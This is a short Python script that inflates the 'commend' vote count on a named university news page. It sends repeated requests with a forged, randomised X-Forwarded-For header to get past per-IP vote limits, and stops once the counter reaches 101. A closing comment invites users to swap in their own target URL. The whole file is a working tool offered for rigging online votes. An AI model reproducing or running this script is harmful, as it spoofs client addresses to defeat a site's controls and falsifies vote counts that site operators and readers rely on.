import http.client,urllib.request,random,re
url = 'http://today.hit.edu.cn/commend/114124_1.htm'
for i in range(0,255):
  request = urllib.request.Request(url)
  request.add_header("X-Forwarded-For",('178.201.%d.%d'%(random.randint(0,255),i)))
  fp=(urllib.request.build_opener()).open(request)
  if re.search('\t101\t', (urllib.request.urlopen(url).read()).decode('GBK')):
    break
#Run in py3.x.x.you should replace url yourself.And votes must under 100.
